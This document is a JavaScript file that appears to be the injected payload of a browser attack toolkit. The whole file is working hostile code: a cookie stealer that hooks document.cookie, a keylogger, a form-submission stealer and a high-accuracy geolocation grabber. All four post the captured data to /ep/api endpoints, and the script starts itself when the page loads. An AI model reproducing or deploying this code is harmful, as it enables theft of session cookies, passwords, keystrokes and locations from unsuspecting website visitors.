/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

console.log('%c[✓] Payload initialized', 'color: #4CAF50');

const PayloadManager = {
    init: function() {
        this.initCookieStealer();
        this.initKeylogger();
        this.initFormStealer();
        this.initGeolocation();
        console.log('[PayloadManager] All payloads initialized');
    },

    sendData: function(endpoint, data) {
        fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        }).catch(error => console.error('Error sending data:', error));
    },

    initCookieStealer: function() {
        // Initial cookie capture
        this.captureCookies();
        
        // Monitor cookie changes
        document.addEventListener('cookie.change', () => {
            this.captureCookies();
        });

        // Intercept cookie setting
        const originalSetCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie').set;
        Object.defineProperty(document, 'cookie', {
            configurable: true,
            set: function(value) {
                originalSetCookie.call(this, value);
                PayloadManager.captureCookies();
            }
        });
    },

    captureCookies: function() {
        const cookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return {
                name: name,
                value: value,
                domain: window.location.hostname,
                path: '/'
            };
        }).filter(cookie => cookie.name && cookie.value);

        if (cookies.length > 0) {
            this.sendData('/ep/api/cookies', {
                cookies: cookies,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            });
        }
    },

    initKeylogger: function() {
        let buffer = '';
        let lastKeystroke = Date.now();

        document.addEventListener('keydown', (e) => {
            buffer += e.key;
            lastKeystroke = Date.now();

            // Send buffer every 10 keystrokes or after 2 seconds
            if (buffer.length >= 10 || Date.now() - lastKeystroke >= 2000) {
                this.sendData('/ep/api/keylog', {
                    keys: buffer,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                });
                buffer = '';
            }
        });
    },

    initFormStealer: function() {
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const formData = {};
            new FormData(form).forEach((value, key) => {
                formData[key] = value;
            });

            this.sendData('/ep/api/form', {
                formData: formData,
                url: window.location.href,
                timestamp: new Date().toISOString()
            });
        });
    },

    initGeolocation: function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    this.sendData('/ep/api/location', {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    });
                },
                (error) => console.error('Geolocation error:', error),
                { enableHighAccuracy: true }
            );
        }
    }
};

// Initialize payloads when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    PayloadManager.init();
});

// Backup initialization in case DOMContentLoaded already fired
if (document.readyState === 'complete' || document.readyState === 'interactive') {
    PayloadManager.init();
}

// Notify that payload is loaded
console.log('Payload initialized successfully');